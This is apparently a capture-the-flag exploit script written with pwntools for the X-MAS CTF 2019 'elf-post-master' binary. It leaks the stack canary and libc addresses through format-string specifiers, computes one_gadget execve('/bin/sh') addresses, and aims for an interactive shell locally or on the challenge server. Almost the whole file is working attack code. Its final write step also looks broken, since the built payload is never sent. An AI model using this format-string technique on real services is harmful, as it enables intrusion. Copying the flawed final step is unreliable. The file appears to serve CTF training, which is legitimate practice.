#!/usr/bin/env python2
'''
    author : tripoloski
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
    generated by skeloski GEF
'''
import sys
from pwn import *
from fmtstr64 import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/xmas-htsp-2019/pwn/elf-post-master/main")
elf = ELF(TARGET)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

    '''
    seccomp allowed syscall
     line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
     0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015
     0005: 0x15 0x08 0x00 0x00000000  if (A == read) goto 0014
     0006: 0x15 0x07 0x00 0x00000001  if (A == write) goto 0014
     0007: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0014
     0008: 0x15 0x05 0x00 0x00000003  if (A == close) goto 0014
     0009: 0x15 0x04 0x00 0x00000005  if (A == fstat) goto 0014
     0010: 0x15 0x03 0x00 0x0000000f  if (A == rt_sigreturn) goto 0014
     0011: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0014
     0012: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0014
     0013: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0015
     0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0015: 0x06 0x00 0x00 0x00000000  return KILL
    '''

    '''
    one gadget
    0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      rcx == NULL

    0x4f322 execve("/bin/sh", rsp+0x40, environ)
    constraints:
      [rsp+0x40] == NULL

    0x10a38c execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL

    '''

def exploit(r):
    # attach(r)
    oneshot = [0x4f2c5 , 0x4f322 , 0x10a38c]
    idx = 6
    idx_canary = "%39$p"
    idx_start_main_231 = "%41$p"
    idx_dl_fini = "%34$p"
    # fmtstr64_payload()

    offset___libc_start_main_ret = 0x21b97
    offset_system = 0x000000000004f440
    offset_dup2 = 0x00000000001109a0
    offset_read = 0x0000000000110070
    offset_write = 0x0000000000110140
    offset_str_bin_sh = 0x1b3e9a

    r.sendlineafter("you?\n",idx_canary)
    r.recvuntil('greetings ')
    canary = int(r.recv(18),16)
    log.info("leaked canary : " + hex(canary))
    r.sendline(idx_start_main_231)
    r.recvuntil(" said:")
    leak_start_main_231 = int(r.recv(15),16)
    r.sendline(idx_dl_fini)
    r.recvuntil(" said:")
    leak_dl_fini = int(r.recv(15),16)


    libc_base = leak_start_main_231 - offset___libc_start_main_ret
    libc_system = libc_base + offset_system
    libc_binsh = libc_base + offset_str_bin_sh
    one_gadget = libc_base + oneshot[0]

    log.info("leaked libc_start_main+231 : " + hex(leak_start_main_231))
    log.info("leaked dl_fini : " + hex(leak_dl_fini))
    log.info("libc base : " + hex(libc_base))
    log.info("libc system() : " + hex(libc_system))
    log.info("/bin/sh : " + hex(libc_binsh))
    log.info("one_gadget : " + hex(one_gadget))


    fmtstr64_payload(idx,{libc_base:one_gadget})
    r.sendline("end of letter")
    r.interactive()
    r.close()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("challs.xmas.htsp.ro", 12003)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
